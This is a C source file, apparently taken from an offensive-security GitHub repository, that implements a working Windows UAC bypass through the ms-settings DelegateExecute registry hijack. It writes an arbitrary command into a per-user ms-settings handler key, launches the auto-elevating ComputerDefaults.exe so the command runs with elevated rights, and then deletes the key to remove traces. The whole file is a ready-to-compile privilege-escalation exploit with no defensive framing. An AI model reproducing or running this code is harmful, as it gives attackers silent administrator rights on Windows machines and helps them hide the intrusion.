//https://github.com/hackerhouse-opensource/MsSettingsDelegateExecute/tree/main
//gcc -m64 -o ms.exe ms.c -ladvapi32 -lshell32


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment(lib, "AdvApi32.lib")
#pragma comment(lib, "Shell32.lib")

int main(int argc, char *argv[]) {
#ifdef _WIN64
    LPWSTR pCMDpath;
    size_t sSize = 0;

    if (argc != 2) {
        printf("[!] Error, you must supply a command\n");
        return EXIT_FAILURE;
    }

    // Allocation d'un buffer pour la chaîne wide
    pCMDpath = (LPWSTR)malloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (pCMDpath == NULL) {
        printf("[!] Memory allocation error\n");
        return EXIT_FAILURE;
    }

    // Conversion de l'argument (multibyte) en chaîne wide
    if (mbstowcs_s(&sSize, pCMDpath, MAX_PATH + 1, argv[1], MAX_PATH) != 0) {
        printf("[!] Error converting command to wide string\n");
        free(pCMDpath);
        return EXIT_FAILURE;
    }

    LRESULT lResult;
    BOOL bResult;
    HKEY hKey = NULL;
    WCHAR szTempBuffer[MAX_PATH + 1];
    DWORD dwData;
    SIZE_T cmdLen;
    SHELLEXECUTEINFOW shinfo;

    // Création (ou ouverture) de la clé de registre ciblée en appelant la version Unicode
    lResult = RegCreateKeyExW(HKEY_CURRENT_USER,
                              L"Software\\Classes\\ms-settings\\shell\\open\\command",
                              0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
    if (lResult != ERROR_SUCCESS) {
        free(pCMDpath);
        return -1;
    }

    // Création de la valeur "DelegateExecute" avec une chaîne vide
    szTempBuffer[0] = L'\0';
    dwData = 0;
    lResult = RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)szTempBuffer, dwData);
    if (lResult != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        free(pCMDpath);
        return -1;
    }

    // Enregistrement de la commande à exécuter dans la valeur par défaut de la clé
    cmdLen = lstrlenW(pCMDpath);
    dwData = (DWORD)((cmdLen + 1) * sizeof(WCHAR));
    lResult = RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)pCMDpath, dwData);
    if (lResult == ERROR_SUCCESS) {
        // Préparation et lancement du binaire système pour déclencher l'exécution de la commande
        ZeroMemory(&shinfo, sizeof(shinfo));
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = L"C:\\Windows\\System32\\ComputerDefaults.exe"; // ou "fodhelper.exe"
        shinfo.lpParameters = L"";
        shinfo.lpDirectory = NULL;
        shinfo.nShow = SW_SHOW;
        shinfo.lpVerb = NULL;
        bResult = ShellExecuteExW(&shinfo);
        if (bResult) {
            WaitForSingleObject(shinfo.hProcess, 0x8000);
            CloseHandle(shinfo.hProcess);
            printf("[+] Success\n");
        }
    }

    // Suppression de la clé de registre pour nettoyer après l'exécution
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command");
    if (hKey != NULL)
        RegCloseKey(hKey);

    free(pCMDpath);
#endif
    return EXIT_SUCCESS;
}
